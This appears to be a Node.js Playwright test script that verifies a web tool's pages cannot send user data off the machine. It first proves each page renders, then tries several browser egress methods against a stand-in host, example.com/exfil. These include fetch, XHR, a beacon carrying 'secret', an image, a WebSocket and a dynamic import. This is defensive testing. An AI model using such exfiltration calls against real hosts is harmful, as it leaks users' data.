#!/usr/bin/env node
/**
 * Asserts that deployed-shape pages cannot phone home.
 *
 * The whole product rests on "nothing you paste leaves your machine". That
 * claim is only as good as the weakest future dependency, so this checks it at
 * the browser level: load real pages under their real headers, try every egress
 * primitive, and require that none of them receives a response.
 *
 * Each page is first proven functional, because a blank page trivially makes no
 * requests and would pass a naive version of this check.
 *
 *   node scripts/verify-egress.mjs http://127.0.0.1:4330/ http://127.0.0.1:4330/json/json-diff/
 */
import { chromium } from 'playwright';

const urls = process.argv.slice(2);
if (urls.length === 0) {
  console.error('usage: verify-egress.mjs <url> [url...]');
  process.exit(2);
}

const browser = await chromium.launch({ executablePath: process.env.CHROMIUM_PATH || undefined });
let failures = 0;

for (const url of urls) {
  const origin = new URL(url).origin;
  const page = await browser.newPage();

  const seen = new Map();
  const key = (r) => r.url() + r.resourceType();
  page.on('request', (r) => {
    if (!r.url().startsWith(origin)) {
      seen.set(key(r), { url: r.url(), type: r.resourceType(), outcome: 'pending' });
    }
  });
  page.on('requestfailed', (r) => {
    const e = seen.get(key(r));
    if (e) e.outcome = `blocked (${r.failure()?.errorText ?? 'unknown'})`;
  });
  page.on('response', (r) => {
    const e = seen.get(r.url() + r.request().resourceType());
    if (e) e.outcome = `RESPONDED ${r.status()}`;
  });

  await page.goto(url, { waitUntil: 'networkidle' });

  // Prove the page actually rendered. Tool pages are proven by driving the
  // tool; content pages (homepage, section landings) have no textarea, so they
  // are proven by having a heading and real body copy.
  const textarea = page.locator('textarea').first();
  let functional;
  let how;
  if ((await textarea.count()) > 0) {
    await textarea.fill('{"probe":1}', { timeout: 10_000 });
    await page.waitForTimeout(600);
    const output = (await page.textContent('pre code').catch(() => '')) ?? '';
    functional = output.length > 0 && !/^No |^Nothing/.test(output);
    how = 'tool produced output';
  } else {
    const heading = await page.textContent('h1').catch(() => '');
    const body = (await page.textContent('body').catch(() => '')) ?? '';
    functional = (heading ?? '').trim().length > 0 && body.trim().length > 400;
    how = 'page rendered a heading and body copy';
  }

  await page.evaluate(async () => {
    const target = 'https://example.com/exfil';
    try { await fetch(`${target}-fetch`); } catch {}
    try { const x = new XMLHttpRequest(); x.open('GET', `${target}-xhr`); x.send(); } catch {}
    try { navigator.sendBeacon(`${target}-beacon`, 'secret'); } catch {}
    try { new Image().src = `${target}-img.png`; } catch {}
    try { new WebSocket('wss://example.com/exfil-ws'); } catch {}
    try { await import(/* @vite-ignore */ `${target}-module.js`); } catch {}
  });
  await page.waitForTimeout(2000);
  await page.close();

  const attempts = [...seen.values()];
  const escaped = attempts.filter((a) => a.outcome.startsWith('RESPONDED'));

  console.log(`\n${url}`);
  for (const a of attempts) console.log(`  ${a.type.padEnd(10)} ${a.outcome.padEnd(38)} ${a.url}`);

  if (!functional) {
    console.error(`  FAIL  page did not render -- a broken page proves nothing about egress`);
    failures++;
  } else if (escaped.length > 0) {
    console.error(`  FAIL  ${escaped.length} request(s) received a response: ${escaped.map((e) => e.url).join(', ')}`);
    failures++;
  } else {
    console.log(`  PASS  ${how}; ${attempts.length} egress attempts, all blocked`);
  }
}

await browser.close();
if (failures > 0) {
  console.error(`\n${failures} page(s) failed egress verification`);
  process.exit(1);
}
console.log(`\nPASS  ${urls.length} page(s) verified`);
